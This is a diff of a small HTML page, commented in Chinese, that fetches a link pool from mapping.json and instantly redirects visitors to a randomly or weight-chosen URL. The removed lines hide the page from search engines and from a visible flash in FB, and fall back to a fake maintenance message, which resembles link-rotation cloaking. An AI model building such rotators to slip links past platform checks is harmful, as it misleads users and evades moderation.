@@ -1,62 +1,39 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh">
 <head>
   <meta charset="UTF-8">
+  <title>Loading...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="robots" content="noindex,nofollow">
-  <style>
-    html, body {
-      margin: 0;
-      padding: 0;
-      height: 100%;
-      background: #fff;
-      overflow: hidden;
-      display: none; /* 防止FB或浏览器闪屏 */
-    }
-  </style>
   <script>
-    (async () => {
-      const MAIN_JSON_URL = "https://liuhongliang11895.github.io/888/mapping.json";
-      const LOCAL_KEY = "lastActiveLinks";
-      let activeLinks = [];
-
+    async function redirect() {
       try {
-        // ① 拉取主仓库链接池
-        const res = await fetch(MAIN_JSON_URL + "?ts=" + Date.now(), { cache: "no-store" });
+        const res = await fetch("mapping.json?ts=" + Date.now()); // 加随机参数避免缓存
         const data = await res.json();
+        const activeLinks = data.links.filter(l => l.active);
 
-        // ② 校验结构
-        if (!data || !Array.isArray(data.links)) throw new Error("Invalid mapping structure");
-
-        // ③ 筛选出激活的链接
-        activeLinks = data.links.filter(l => l.active);
-        if (!activeLinks.length) throw new Error("No active links");
-
-        // ④ 缓存当前活跃链接
-        localStorage.setItem(LOCAL_KEY, JSON.stringify(activeLinks));
-
-        // ⑤ 随机分配链接
-        const idx = Math.floor(Math.random() * activeLinks.length);
-
-        // ⑥ 秒跳转
-        location.replace(activeLinks[idx].url);
-
-      } catch (e) {
-        console.error("Redirect failed:", e);
-
-        // ⑦ 断网回退逻辑
-        const cached = JSON.parse(localStorage.getItem(LOCAL_KEY) || "[]");
-        if (cached.length) {
-          location.replace(cached[Math.floor(Math.random() * cached.length)].url);
-        } else {
-          document.open();
-          document.write("<h2>System maintenance. Please try again later.</h2>");
-          document.close();
-          document.body.style.display = 'block';
+        if (activeLinks.length === 0) {
+          return; // 没有可用链接则停留
         }
+
+        // 按权重抽签
+        const weighted = [];
+        activeLinks.forEach(l => {
+          for (let i = 0; i < (l.weight || 1); i++) {
+            weighted.push(l.url);
+          }
+        });
+        const targetUrl = weighted[Math.floor(Math.random() * weighted.length)];
+
+        // 立即跳转
+        window.location.replace(targetUrl);
+      } catch (e) {
+        console.error("跳转失败", e);
       }
-    })();
+    }
+
+    redirect();
   </script>
 </head>
-<body></body>
+<body>
+</body>
 </html>
